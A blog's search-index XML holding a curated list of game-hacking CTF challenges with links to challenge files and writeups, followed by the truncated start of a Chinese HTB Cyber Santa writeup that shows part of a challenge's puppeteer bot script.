<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CTF_Game_Challenges</title>
    <url>/2021/06/23/CTF-Game-Challenges/</url>
    <content><![CDATA[<h1 id="CTF-Game-Challenges"><a href="#CTF-Game-Challenges" class="headerlink" title="CTF Game Challenges"></a>CTF Game Challenges</h1><p>I have been learning about game hacking recently and the best way I could find legally to practice is by playing <a href="https://ctftime.org/ctf-wtf/">CTFs</a>.<br>But the difficult part is finding out the Game challenges from previous ctfs.  </p>
<p>This list includes game challenges I encountered while playing ctfs and reading writeups.  </p>
<p><img src="https://github.com/mrT4ntr4/CTF-Game-Challenges/raw/master/assets/follow_white_rabbit.jpg" alt="cscg2020_rabbit" height="420"/></p>
<p>Also just FYI as some of the gameservers are offline and there is no clear way to set it up or the developers have not opensourced it we can’t play it now.  </p>
<h2 id="Contents"><a href="#Contents" class="headerlink" title="Contents"></a>Contents</h2><p><a href="#pc-games">PC Games</a><br><a href="#retro-gameboynes">Retro [Gameboy/NES]</a><br><a href="#android">Android</a><br><a href="#web">Web</a>  </p>
<hr>
<h3 id="PC-Games"><a href="#PC-Games" class="headerlink" title="PC Games"></a>PC Games</h3><ol>
<li><p><strong>DragonSector CTF 2018</strong></p>
<ul>
<li><p><a href="https://github.com/gynvael/arcanesector">Arcane Sector</a></p>
<p>Solution Videos<br><a href="https://youtu.be/8bjFplctDE0">https://youtu.be/8bjFplctDE0</a><br><a href="https://youtu.be/j0taw78tCYs">https://youtu.be/j0taw78tCYs</a>  </p>
</li>
</ul>
</li>
<li><p><strong>Nullcon HackIM 2020</strong></p>
<ul>
<li><a href="https://github.com/nullcon/hackim-2020/tree/master/zelda/ZeldaAdventures">ZeldaAdventures</a></li>
<li><p><a href="https://github.com/nullcon/hackim-2020/tree/master/zelda/ZeldaInSpace">ZeldaInSpace</a>  </p>
<p><a href="https://medium.com/@roottusk/helping-zelda-capture-flags-nullcon-hackim-2020-f2480099cc3c">https://medium.com/@roottusk/helping-zelda-capture-flags-nullcon-hackim-2020-f2480099cc3c</a><br><a href="https://devploit.dev/2020/02/09/nullconHackIM-ZeldaAdventures.html">https://devploit.dev/2020/02/09/nullconHackIM-ZeldaAdventures.html</a></p>
</li>
</ul>
</li>
<li><p><strong>Pwn Adventure Series by Vector35</strong></p>
<ul>
<li><a href="https://sourcery.pwnadventure.com/">PwnAdventure Sourcery (In Browser)</a></li>
<li><a href="http://ghostintheshellcode.com/#pwnadventure2">PwnAdventure 2</a></li>
<li><p><a href="http://pwnadventure.com/">PwnAdventure 3</a></p>
<p>Writeups<br><a href="https://thekidofarcrania.gitlab.io/2018/11/18/csaw-finals-18/">https://thekidofarcrania.gitlab.io/2018/11/18/csaw-finals-18/</a><br><a href="https://www.digitaloperatives.com/2014/01/19/ghost-in-the-shellcode-2014-write-up-choose-your-pwn-adventure-2-200-portal/">https://www.digitaloperatives.com/2014/01/19/ghost-in-the-shellcode-2014-write-up-choose-your-pwn-adventure-2-200-portal/</a><br><a href="http://lockboxx.blogspot.com/2014/01/ghost-in-shellcode-2014-ctf-writeup.html">http://lockboxx.blogspot.com/2014/01/ghost-in-shellcode-2014-ctf-writeup.html</a><br><a href="https://github.com/ctfs/write-ups-2014/tree/master/ghost-in-the-shellcode-2014">https://github.com/ctfs/write-ups-2014/tree/master/ghost-in-the-shellcode-2014</a><br><a href="https://x-c3ll.github.io/posts/Frida-Pwn-Adventure-3/">https://x-c3ll.github.io/posts/Frida-Pwn-Adventure-3/</a><br><a href="https://blog.keyidentity.com/tag/pwnadventure/">https://blog.keyidentity.com/tag/pwnadventure/</a>  </p>
<p>Solution Videos<br><a href="https://www.youtube.com/playlist?list=PLhixgUqwRTjzzBeFSHXrw9DnQtssdAwgG">https://www.youtube.com/playlist?list=PLhixgUqwRTjzzBeFSHXrw9DnQtssdAwgG</a>  </p>
</li>
</ul>
</li>
<li><p><strong>Flare-On 6 (2019)</strong></p>
<ul>
<li><p><a href="http://flare-on.com/files/Flare-On6_Challenges.zip">Challenge-8 : DnsChess</a>  </p>
<p><a href="https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/FlareOn6_Challenge4_Solution_DnsChess.pdf">https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/FlareOn6_Challenge4_Solution_DnsChess.pdf</a><br><a href="https://0xdf.gitlab.io/flare-on-2019/dnschess.html">https://0xdf.gitlab.io/flare-on-2019/dnschess.html</a>  </p>
</li>
</ul>
</li>
<li><p><strong>Insomni Hack</strong> </p>
<ul>
<li><p><a href="https://s3-eu-west-1.amazonaws.com/insomnihack/game/Windows.zip">Pwn Arena</a></p>
<p>More Info :    <a href="https://www.insomnihack.ch/ctf-test-the-game/">https://www.insomnihack.ch/ctf-test-the-game/</a>  </p>
<p>Writeups<br><a href="https://gist.github.com/bkth/f8d9965bb985af0d925352a88067b240">https://gist.github.com/bkth/f8d9965bb985af0d925352a88067b240</a>  </p>
</li>
</ul>
</li>
<li><p><strong>RiceTeaCatPanda CTF 2020</strong></p>
<ul>
<li><a href="https://github.com/JEF1056/riceteacatpanda/tree/master/Tea%20Clicker%20(150">Tea Clicker</a>)</li>
<li><p><a href="https://github.com/JEF1056/riceteacatpanda/tree/master/Work%20In%20Progress%20(400">Work In Progress</a>)</p>
<p><a href="https://blog.nlegall.fr/rtcp-tea-clicker.html">https://blog.nlegall.fr/rtcp-tea-clicker.html</a><br><a href="https://blog.nlegall.fr/rtcp-work-in-progress.html">https://blog.nlegall.fr/rtcp-work-in-progress.html</a>  </p>
</li>
</ul>
</li>
<li><p><strong>InsomniHack 2017</strong></p>
<ul>
<li><p><a href="https://download.scrt.ch/FPS/Windows.zip">FPS</a></p>
<p><a href="https://blog.scrt.ch/2017/06/06/fps-write-ups-for-insomnihack-2017/">https://blog.scrt.ch/2017/06/06/fps-write-ups-for-insomnihack-2017/</a>   </p>
</li>
</ul>
</li>
<li><p><strong>Secuinside CTF Quals 2013</strong></p>
<ul>
<li><p><a href="https://docs.google.com/file/d/0Bxq9FZappPXQY1Y0VWtyMENjM3c/edit">game</a></p>
<p><a href="http://lockboxx.blogspot.com/2013/06/intro-to-reversing-windows-portable.html">http://lockboxx.blogspot.com/2013/06/intro-to-reversing-windows-portable.html</a>  </p>
</li>
</ul>
</li>
<li><p><strong>BSidesCBR CTF 2017</strong> </p>
<ul>
<li>Let’s Play a Game!</li>
<li><p>Old PC</p>
<p><a href="https://codecadets.blog/bsides-canberra-lets-play-a-game-aa562be9b129">https://codecadets.blog/bsides-canberra-lets-play-a-game-aa562be9b129</a><br><a href="https://codecadets.blog/bsides-canberra-2018-ctf-write-up-old-pc-37116ab7625e/">https://codecadets.blog/bsides-canberra-2018-ctf-write-up-old-pc-37116ab7625e/</a>  </p>
</li>
</ul>
</li>
<li><p><strong>Thotcon 0xa</strong></p>
<ul>
<li><a href="http://quake.token.wtf/">quack (In Browser)</a></li>
</ul>
<p><a href="https://lturner.net/blog/thotcon-0xa/">https://lturner.net/blog/thotcon-0xa/</a>  </p>
</li>
<li><p><strong>CSCG 2020</strong></p>
<ul>
<li><p><a href="https://earth.2020.cscg.de/tasks/Follow%20The%20White%20Rabbit%20-%20Cave">Follow The White Rabbit</a><br>Challs include <code>Cave &amp; Datamining</code>  </p>
</li>
<li><p><a href="http://maze.liveoverflow.com/">Maze</a><br>Challs include <code>Emoji, M4z3 Runn3r, Map Radar, Maze Runner, The Floor Is Lava, Tower</code>  </p>
</li>
</ul>
<p><a href="https://stygiansecurity.com/following-the-white-rabbit-in-game/">https://stygiansecurity.com/following-the-white-rabbit-in-game/</a><br><a href="https://jamchamb.github.io/2020/06/21/cscg2020-maze-writeups.html">https://jamchamb.github.io/2020/06/21/cscg2020-maze-writeups.html</a><br><a href="https://github.com/bburky/mmo-maze-frida">https://github.com/bburky/mmo-maze-frida</a>  </p>
</li>
<li><p><strong>XMAS CTF 2019</strong></p>
<ul>
<li><a href="https://drive.google.com/file/d/1pSe5wVzYU7kC69v7oFGoPT13Sm5W2PBh/view">Lapland Mission</a></li>
</ul>
<p><a href="https://github.com/archercreat/CTF-Writeups/blob/master/X-MAS%20CTF/Lapland%20Mission/README.md">https://github.com/archercreat/CTF-Writeups/blob/master/X-MAS%20CTF/Lapland%20Mission/README.md</a>  </p>
</li>
<li><p><strong>TJCTF 2020</strong></p>
<ul>
<li><a href="https://drive.google.com/file/d/19_sHTHhQ1dmXK9zmpSCuulaBXYjwAJyw/view">Gamer F</a></li>
<li><a href="https://drive.google.com/file/d/19cl1546hn9EymbtZg7YKBrw4u_TPDcjc/view">Gamer R</a></li>
</ul>
<p><a href="https://deadlock.team/ctf/forensic/tjctf%202020/2020/05/27/TJCTF-gamerf/">https://deadlock.team/ctf/forensic/tjctf%202020/2020/05/27/TJCTF-gamerf/</a><br><a href="https://deadlock.team/ctf/rev/tjctf%202020/2020/05/27/TJCTF-gamerr/">https://deadlock.team/ctf/rev/tjctf%202020/2020/05/27/TJCTF-gamerr/</a>  </p>
</li>
<li><p><strong>Redpwn CTF</strong></p>
<ul>
<li>2019<ul>
<li><a href="https://csy54.github.io/2019/08/Writeup-RedpwnCTF/Password_Manager.zip">MC Password Storage</a>  </li>
</ul>
</li>
<li>2020<ul>
<li><a href="https://github.com/redpwn/redpwnctf-2020-challenges/tree/master/rev/i-wanna-find-the-flag">i-wanna-find-the-flag</a></li>
</ul>
</li>
</ul>
<p><a href="https://ctftime.org/writeup/16176">https://ctftime.org/writeup/16176</a><br><a href="https://spinstars.dev/writeups/2/">https://spinstars.dev/writeups/2/</a><br><a href="https://github.com/shiversoftdev/redpwn-i-wanna-find-the-flag/blob/master/README.md">https://github.com/shiversoftdev/redpwn-i-wanna-find-the-flag/blob/master/README.md</a>  </p>
</li>
<li><p><strong>Pwnium CTF 2014</strong></p>
<ul>
<li><a href="https://github.com/ctfs/write-ups-2014/tree/master/pwnium-ctf-2014/old-world">Old World</a></li>
</ul>
<p><a href="https://in3o.wordpress.com/2014/07/06/pwnium-ctf-2014-reverse-100-old-school/">https://in3o.wordpress.com/2014/07/06/pwnium-ctf-2014-reverse-100-old-school/</a>  </p>
</li>
<li><p><strong>Hackerearth CipherCombat 2.0</strong></p>
<ul>
<li><a href="http://ge.tt/5Qka2L23">Pong</a></li>
</ul>
<p><a href="https://s3-ap-southeast-1.amazonaws.com/he-public-data/pong-writeupd842017.pdf">https://s3-ap-southeast-1.amazonaws.com/he-public-data/pong-writeupd842017.pdf</a>  </p>
</li>
<li><p><strong>HackTheVote CTF 2016</strong></p>
<ul>
<li><a href="https://github.com/RPISEC/HackTheVote/tree/master/reversing/theWall">The Wall</a></li>
</ul>
<p><a href="https://emanuelecozzi.net/posts/ctf/how-to-fly-with-radare2">https://emanuelecozzi.net/posts/ctf/how-to-fly-with-radare2</a></p>
</li>
<li><p><strong>Plaid CTF 2020</strong></p>
<ul>
<li><a href="https://ctf.harrisongreen.me/code/2020/plaidctf/game_cleaned.rc1">Watness 2 [Mac]</a></li>
</ul>
<p><a href="https://ctf.harrisongreen.me/2020/plaidctf/the_watness_2/">https://ctf.harrisongreen.me/2020/plaidctf/the_watness_2/</a>    </p>
</li>
<li><p><strong>Defcon CTF Quals 2020</strong></p>
<ul>
<li><a href="https://github.com/TFNS/writeups/tree/master/2020-05-18-DefconQualification/babymaze">Babymaze</a></li>
<li>Mamamaze  </li>
</ul>
</li>
<li><p><strong>Flare-On 5 (2018)</strong></p>
<ul>
<li><a href="https://github.com/albertzsigovits/flare-on-challenges/blob/master/2018/FlareOn5_Challenges/02_UltimateMinesweeper.7z">Challenge-2 - Ultimate Minesweeper</a></li>
</ul>
<p><a href="https://bruce30262.github.io/flare-on-challenge-2018-write-up/#level-2">https://bruce30262.github.io/flare-on-challenge-2018-write-up/#level-2</a><br><a href="http://justanotherdfirblog.blogspot.com/2018/10/flare-on-2018-challenge-2-ultimate.html">http://justanotherdfirblog.blogspot.com/2018/10/flare-on-2018-challenge-2-ultimate.html</a><br><a href="https://medium.com/@EpsilonCalculus/write-up-to-the-2018-flare-on-challenge-infosec-newbie-edition-flareon5-6444431444b4">https://medium.com/@EpsilonCalculus/write-up-to-the-2018-flare-on-challenge-infosec-newbie-edition-flareon5-6444431444b4</a>  </p>
</li>
<li><p><strong>3kCTF-2020</strong></p>
<ul>
<li><a href="https://drive.google.com/file/d/1VHlnOdGuoIKPer_s2AV5-tQjOzaCQlyB/">Game 1-2</a></li>
</ul>
<p><a href="https://tcode2k16.github.io/blog/posts/2020-07-26-3kctf-writeup/#game-1">https://tcode2k16.github.io/blog/posts/2020-07-26-3kctf-writeup/#game-1</a>  </p>
</li>
<li><p><strong>ALLES! CTF 2020</strong></p>
<ul>
<li><a href="https://github.com/allesctf/2020/tree/master/challenges/allescraft">ALLES!Craft</a>  </li>
</ul>
<p><a href="https://github.com/RickdeJager/CTF/blob/master/ALLES2020/ALLESCraft/writeup.md">https://github.com/RickdeJager/CTF/blob/master/ALLES2020/ALLESCraft/writeup.md</a>   </p>
</li>
<li><p><strong>Flare-On 7 (2020)</strong></p>
<ul>
<li><a href="https://github.com/aleeamini/Flareon7-2020/raw/main/3/3_-_wednesday.7z">Challenge-3 - Wednesday</a>  </li>
</ul>
<p><a href="https://explained.re/posts/flare-on7-wednesday/">https://explained.re/posts/flare-on7-wednesday/</a><br><a href="https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/flareon7-challenge3-solution.pdf">https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/flareon7-challenge3-solution.pdf</a>  </p>
</li>
<li><p><strong>NorthSec CTF 2019</strong></p>
<ul>
<li>DOOM</li>
</ul>
<p><a href="http://www.agardner.me/securit/ctf/northsec/2019/2019/05/19/northsec-ctf-part-1-doom.html">http://www.agardner.me/securit/ctf/northsec/2019/2019/05/19/northsec-ctf-part-1-doom.html</a><br><a href="https://re-dojo.github.io/write-ups/2019-05-26-nsec-2019-doom/">https://re-dojo.github.io/write-ups/2019-05-26-nsec-2019-doom/</a>  </p>
</li>
</ol>
<hr>
<h3 id="Retro-Gameboy-NES"><a href="#Retro-Gameboy-NES" class="headerlink" title="Retro [Gameboy/NES]"></a>Retro [Gameboy/NES]</h3><ol>
<li><p><strong>Flare-On 6 (2019)</strong></p>
<ul>
<li><p><a href="http://flare-on.com/files/Flare-On6_Challenges.zip">Challenge-8 : Snake</a> </p>
<p><a href="https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/FlareOn6_Challenge8_Solution_SNAKE.pdf">https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/FlareOn6_Challenge8_Solution_SNAKE.pdf</a><br><a href="https://malwareunicorn.org/workshops/flareon6_2019.html#8">https://malwareunicorn.org/workshops/flareon6_2019.html#8</a></p>
</li>
</ul>
</li>
<li><p><strong>Square CTF 2017</strong></p>
<ul>
<li><p><a href="https://github.com/VoidHack/write-ups/blob/master/Square%20CTF%202017/reverse/gameboy/mission.gb">gameboy</a></p>
<p>Writeups &amp; other game files<br><a href="https://github.com/VoidHack/write-ups/tree/master/Square%20CTF%202017/reverse/gameboy">https://github.com/VoidHack/write-ups/tree/master/Square%20CTF%202017/reverse/gameboy</a>  </p>
</li>
</ul>
</li>
<li><p><strong>Swamp CTF 2018</strong></p>
<ul>
<li><a href="https://github.com/adeebshihadeh/ctf/blob/221d5bdeed6eadb206e72f99af7954942502d196/swampctf/game.gb">Ethereal Boy</a></li>
<li><p><a href="https://github.com/adeebshihadeh/ctf/blob/221d5bdeed6eadb206e72f99af7954942502d196/swampctf/game2.gb">Ethereal Boy Advanced</a></p>
<p><a href="https://github.com/DancingSimpletons/writeups/blob/master/swampctf-2018/Etherealboy.md">https://github.com/DancingSimpletons/writeups/blob/master/swampctf-2018/Etherealboy.md</a>  </p>
</li>
</ul>
</li>
<li><p><strong>UTCTF 2020</strong></p>
<ul>
<li><p><a href="https://github.com/utisss/UTCTF-20/tree/master/gameboy-tas">GameboyTAS</a></p>
<p><a href="https://www.danbrodsky.me/writeups/utctf2020-gameboytas/">https://www.danbrodsky.me/writeups/utctf2020-gameboytas/</a>  </p>
</li>
</ul>
</li>
<li><p><strong>HITB Amsterdam CTF 2019</strong></p>
<ul>
<li><p><a href="https://storage.hitbctf.nl/hitb2019ams/eighties/eighties.387eb81c5c27.nes">Eighties</a></p>
<p><a href="https://beunhazen.net/2019/05/24/hitams19-eighties-writeup.html">https://beunhazen.net/2019/05/24/hitams19-eighties-writeup.html</a>  </p>
</li>
</ul>
</li>
<li><p><strong>r2boy series</strong></p>
<ul>
<li><p>2017  </p>
<ul>
<li><a href="https://github.com/radareorg/r2con2017/blob/master/Competitions/Crackmes/simple.gb">Simple</a></li>
<li><a href="https://github.com/radareorg/r2con2017/blob/master/Competitions/Crackmes/harder.gb">Harder</a></li>
</ul>
</li>
<li><p>2019  </p>
<ul>
<li><a href="https://github.com/s0larpunk/ctf_challenge_writeups/blob/f4960a50fdf5446f13e4ee3131900901777e86ec/2019/ctf_solutions/radare_ctf/r2boy.gb">r2boy1</a></li>
<li><a href="https://github.com/s0larpunk/ctf_challenge_writeups/blob/f4960a50fdf5446f13e4ee3131900901777e86ec/2019/ctf_solutions/radare_ctf/r2boy1.gb">r2boy2</a></li>
</ul>
<p><a href="https://www.megabeets.net/reverse-engineering-a-gameboy-rom-with-radare2/">https://www.megabeets.net/reverse-engineering-a-gameboy-rom-with-radare2/</a><br><a href="https://bananamafia.dev/post/r2ctf-2019/">https://bananamafia.dev/post/r2ctf-2019/</a><br><a href="https://github.com/s0larpunk/ctf_challenge_writeups/blob/f4960a50fdf5446f13e4ee3131900901777e86ec/2019/ctf_solutions/radare_ctf/radare_ctf_writeup.md">https://github.com/s0larpunk/ctf_challenge_writeups/blob/f4960a50fdf5446f13e4ee3131900901777e86ec/2019/ctf_solutions/radare_ctf/radare_ctf_writeup.md</a>  </p>
</li>
</ul>
</li>
<li><p><strong>Hacklu CTF 2014</strong></p>
<ul>
<li><p><a href="https://github.com/ctfhacker/ctf-binaries/tree/master/binary-ctf/hack-lu-ctf-2014/at-gunpoint">At gunpoint</a></p>
<p><a href="https://www.tasteless.eu/post/2014/10/hack-lu-ctf-2014-at-gunpoint/">https://www.tasteless.eu/post/2014/10/hack-lu-ctf-2014-at-gunpoint/</a><br><a href="https://w00tsec.blogspot.com/2014/10/hacklu-2014-ctf-write-up-at-gunpoint.html">https://w00tsec.blogspot.com/2014/10/hacklu-2014-ctf-write-up-at-gunpoint.html</a><br><a href="https://radareorg.github.io/blog/posts/solving-at-gunpoint-from-hack-lu-2014-with-radare2/">https://radareorg.github.io/blog/posts/solving-at-gunpoint-from-hack-lu-2014-with-radare2/</a>  </p>
</li>
</ul>
</li>
<li><p><strong>CSAW CTF 2015</strong></p>
<ul>
<li><a href="https://github.com/osirislab/CSAW-CTF-2015-Quals/tree/master/reversing/HackingTime">Hacking Time</a></li>
<li><p><a href="https://github.com/Vector35/PwnAdventureZ">PwnAdventure Z</a></p>
<p>Physical Cartridge for PwnAdventure Z<br><a href="https://shop.binary.ninja/collections/all/products/pwn-adventure-z-cartridge">https://shop.binary.ninja/collections/all/products/pwn-adventure-z-cartridge</a>  </p>
<p>Writeups<br><a href="https://bruce30262.github.io/csaw-ctf-2015-hacking-time/">https://bruce30262.github.io/csaw-ctf-2015-hacking-time/</a><br><a href="https://www.voidsecurity.in/2015/09/csaw-ctf-re200-hacking-time.html">https://www.voidsecurity.in/2015/09/csaw-ctf-re200-hacking-time.html</a><br><a href="https://www.hackucf.org/csaw-2015-finals-blox-pwnadventurez-re-250/">https://www.hackucf.org/csaw-2015-finals-blox-pwnadventurez-re-250/</a>    </p>
</li>
</ul>
</li>
<li><p><strong>Reply CTF 2018</strong></p>
<ul>
<li><p><a href="https://challenges.reply.com/tamtamy/file/download-29827.action">GOODBOY</a></p>
<p><a href="https://xz.aliyun.com/t/2858#toc-4">https://xz.aliyun.com/t/2858#toc-4</a>  </p>
</li>
</ul>
</li>
<li><p><strong>TUM CTF Teaser 2015</strong></p>
<ul>
<li><a href="https://2015.ctf.link/challenges/12/">Cloud Gaming</a></li>
</ul>
</li>
<li><p><strong>Rootme</strong></p>
<ul>
<li><a href="https://www.root-me.org/en/Challenges/Cracking/GB-Basic-GameBoy-crackme">Basic GameBoy crackme</a></li>
</ul>
</li>
<li><p><strong>44con CTF 2018</strong></p>
<ul>
<li><a href="https://drive.google.com/open?id=1K2t6zyJxzCwBkdJFMWRrcenyoZl5aetx">SMB</a></li>
</ul>
<p><a href="https://leigh-annegalloway.com/44con-ctf-writeup/">https://leigh-annegalloway.com/44con-ctf-writeup/</a>  </p>
</li>
<li><p><strong>KipodAfterFree CTF 2020</strong></p>
<ul>
<li><a href="https://github.com/Michaelikarasik/ctfs/tree/4a68f238edb7123522af1c7265dac89b3831c813/jeopardy/kipod_after_free/gamebob">Gamebob</a></li>
</ul>
<p><a href="https://teamrocketist.github.io/2019/12/26/Reverse-Kipod2019-GameBob/">https://teamrocketist.github.io/2019/12/26/Reverse-Kipod2019-GameBob/</a>  </p>
</li>
<li><p><strong>RCTF 2020</strong></p>
<ul>
<li><a href="https://adworld.xctf.org.cn/media/uploads/task/96885ee00f0a43369b656e0d1498a040.zip">My Switch Game</a></li>
</ul>
<p><a href="https://blog.rois.io/en/2020/rctf-2020-official-writeup-2/">https://blog.rois.io/en/2020/rctf-2020-official-writeup-2/</a>  </p>
</li>
<li><p><strong>CTFZone Quals 2019</strong></p>
<ul>
<li><a href="https://captf3.captf.com/2019/ctfzone/reversing/m394dr1v3-cr4ckm3/">M394Dr1V3 cr4cKM3</a></li>
</ul>
<p><a href="https://ptr-yudai.hatenablog.com/entry/2019/12/02/093635">https://ptr-yudai.hatenablog.com/entry/2019/12/02/093635</a>  </p>
</li>
<li><p><strong>HackTheBox</strong></p>
<ul>
<li><a href="https://www.hackthebox.eu/home/challenges/Reversing">Nostalgia</a>  </li>
</ul>
<p><a href="https://exp111.github.io/Nostalgia/">https://exp111.github.io/Nostalgia/</a>  </p>
</li>
<li><p><strong>InCTF 2020</strong></p>
<ul>
<li><a href="https://0xd13a.github.io/ctfs/inctf2020/invisible-maze/output.gb">The Invisible Maze</a></li>
</ul>
<p><a href="https://0xd13a.github.io/ctfs/inctf2020/invisible-maze/">https://0xd13a.github.io/ctfs/inctf2020/invisible-maze/</a>  </p>
</li>
<li><p><strong>ALLES! CTF 2020</strong></p>
<ul>
<li><a href="https://github.com/allesctf/2020/blob/master/challenges/flag_service_revolution/public/flag_service_revolution.7z">Flag Service Revolution</a></li>
</ul>
<p><a href="https://blog.d1r3wolf.com/2020/09/alles-ctf-2020-writeups.html#flag_resolution">https://blog.d1r3wolf.com/2020/09/alles-ctf-2020-writeups.html#flag_resolution</a>    </p>
</li>
</ol>
<hr>
<h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><ol>
<li><p><strong>Google CTF 2018</strong></p>
<ul>
<li><p><a href="https://github.com/google/google-ctf/tree/8e0f4a637d295f46ebb4a7213cdf4947b3881eec/2018/quals/re-android">shall we play a game</a></p>
<p><a href="https://w0y.at/writeup/2018/07/02/google-ctf-quals-2018-shall-we-play-a-game.html">https://w0y.at/writeup/2018/07/02/google-ctf-quals-2018-shall-we-play-a-game.html</a><br><a href="https://github.com/AdityaVallabh/ctf-write-ups/tree/master/Google%20CTF%202018/Shall%20We%20Play%20a%20Game%3F">https://github.com/AdityaVallabh/ctf-write-ups/tree/master/Google%20CTF%202018/Shall%20We%20Play%20a%20Game%3F</a>  </p>
</li>
</ul>
</li>
<li><p><strong>Google CTF 2019</strong></p>
<ul>
<li><p><a href="https://github.com/google/google-ctf/tree/master/2019/quals/reversing-android/attachments">Flappy Bird</a></p>
<p><a href="https://blog.nviso.eu/2019/07/18/solving-flaggy-bird-google-ctf-2019/">https://blog.nviso.eu/2019/07/18/solving-flaggy-bird-google-ctf-2019/</a>  </p>
</li>
</ul>
</li>
<li><p><strong>RCTF 2020</strong></p>
<ul>
<li><p><a href="https://adworld.xctf.org.cn/media/uploads/task/cb3f4ef2acd145beb3f5b671fda677a2.zip">Play The Game</a></p>
<p><a href="https://blog.rois.io/en/2020/rctf-2020-official-writeup-2/">https://blog.rois.io/en/2020/rctf-2020-official-writeup-2/</a>  </p>
</li>
</ul>
</li>
<li><p><strong>Defenit CTF 2020</strong>  </p>
<ul>
<li><p><a href="https://drive.google.com/file/d/1AMlDm8OGFwwKk2vJYTT5W_2GqY89xMqc/view">Catchmouse</a>  </p>
<p><a href="https://github.com/TFNS/writeups/blob/master/2020-06-05-DefenitCTF/catchmouse/README.md">https://github.com/TFNS/writeups/blob/master/2020-06-05-DefenitCTF/catchmouse/README.md</a>  </p>
</li>
</ul>
</li>
<li><p><strong>ALLES! CTF 2020</strong></p>
<ul>
<li><p><a href="https://github.com/allesctf/2020/blob/master/challenges/prehistoric-mario/public/prehistoric-mario.apk">Prehistoric Mario</a></p>
<p><a href="https://abhaynayar.com/ctf/alles.html">https://abhaynayar.com/ctf/alles.html</a><br><a href="https://github.com/ARESxCyber/Writeups/tree/master/ALLES!%20CTF%202020/prehistoric%20mario">https://github.com/ARESxCyber/Writeups/tree/master/ALLES!%20CTF%202020/prehistoric%20mario</a><br><a href="https://blog.d1r3wolf.com/2020/09/alles-ctf-2020-writeups.html#prehistoric_mario">https://blog.d1r3wolf.com/2020/09/alles-ctf-2020-writeups.html#prehistoric_mario</a>  </p>
</li>
</ul>
</li>
</ol>
<hr>
<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p>Most of the web games are dead!   </p>
<ol>
<li><p><strong>CSAW CTF Finals 2018</strong></p>
<ul>
<li><p><a href="https://github.com/osirislab/CSAW-CTF-2018-Finals/tree/a25d847da426baa6ebe54545ac540e12ab6408ee/pwn/wic_wac_woe">Wic Wac Woe</a></p>
<p><a href="https://zackorndorff.com/2018/11/13/csaw-ctf-finals-2018-wic-wac-woe-1-writeup/">https://zackorndorff.com/2018/11/13/csaw-ctf-finals-2018-wic-wac-woe-1-writeup/</a></p>
</li>
</ul>
</li>
<li><p><strong>Plaid CTF 2019</strong></p>
<ul>
<li><p>Watness  </p>
<p><a href="http://blog.rb-tree.xyz/2019/04/22/plaidctf-2019-the-wat-ness/">http://blog.rb-tree.xyz/2019/04/22/plaidctf-2019-the-wat-ness/</a>  </p>
</li>
</ul>
</li>
<li><p><strong>TJCTF 2020</strong></p>
<ul>
<li><p>Gamer W</p>
<p><a href="https://canirudh.codes/posts/tjctf-gamerw-writeup/">https://canirudh.codes/posts/tjctf-gamerw-writeup/</a>  </p>
</li>
</ul>
</li>
<li><p><strong>Bountycon 2020</strong></p>
<ul>
<li><p>Proof-of-Game</p>
<p><a href="https://kishanbagaria.com/bountycon-2020/#proof-of-game--web--published-dec-30">https://kishanbagaria.com/bountycon-2020/#proof-of-game--web--published-dec-30</a>  </p>
</li>
</ul>
</li>
<li><p><strong>Dice CTF 2021</strong></p>
<ul>
<li><p><a href="https://github.com/dicegang/dicectf-2021-challs/tree/master/rev/dice-is-you">DICE IS YOU</a>  </p>
<p><a href="https://thegoonies.github.io/2021/02/08/dicectf-2021-rev-dice-is-you/">https://thegoonies.github.io/2021/02/08/dicectf-2021-rev-dice-is-you/</a><br><a href="https://debugmen.dev/ctf-writeup/2021/02/08/diceisyou.html">https://debugmen.dev/ctf-writeup/2021/02/08/diceisyou.html</a><br><a href="https://github.com/nreusch/writeups/blob/master/dicectf_2021/writeup.md">https://github.com/nreusch/writeups/blob/master/dicectf_2021/writeup.md</a>  </p>
</li>
</ul>
</li>
</ol>
<hr>
<h2 id="Contributing"><a href="#Contributing" class="headerlink" title="Contributing"></a>Contributing</h2><p>Help me in keeping this list updated by :  </p>
<ul>
<li>Providing new games you encounter in ctfs to me over Twitter : <a href="https://twitter.com/MrT4ntr4">@MrT4ntr4</a></li>
<li>Opening Pull Requests</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>HTB_Cyber_Santa</title>
    <url>/2022/01/02/CTF/HTB-Cyber-Santa/</url>
    <content><![CDATA[<h1 id="HTB-Cyber-Santa"><a href="#HTB-Cyber-Santa" class="headerlink" title="HTB-Cyber Santa"></a>HTB-Cyber Santa</h1><p><img src="https://s2.loli.net/2022/01/02/B6GP7YuqO24dzDj.png" alt="image"></p>
<p>文件链接：链接：<a href="https://pan.baidu.com/s/1XaA6j3LO0Pcp2pRfc8FyPg">https://pan.baidu.com/s/1XaA6j3LO0Pcp2pRfc8FyPg</a><br>提取码：jd48</p>
<p><img src="https://s2.loli.net/2022/01/02/X94JxWnys8ufG1N.png" alt="image-20220102204421845"></p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Toy-Workshop"><a href="#Toy-Workshop" class="headerlink" title="Toy Workshop"></a>Toy Workshop</h3><p>题目源码:</p>
<p>核心源码：</p>
<p>bot.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">&#x27;puppeteer&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> browser_options = &#123;</span><br><span class="line">	<span class="attr">headless</span>: <span class="literal">true</span>,</span><br><span class="line">	<span class="attr">args</span>: [</span><br><span class="line">		<span class="string">&#x27;--no-sandbox&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;--disable-background-networking&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;--disable-default-apps&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;--disable-extensions&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;--disable-gpu&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;--disable-sync&#x27;</span>,</span><br><span class="line">		<span 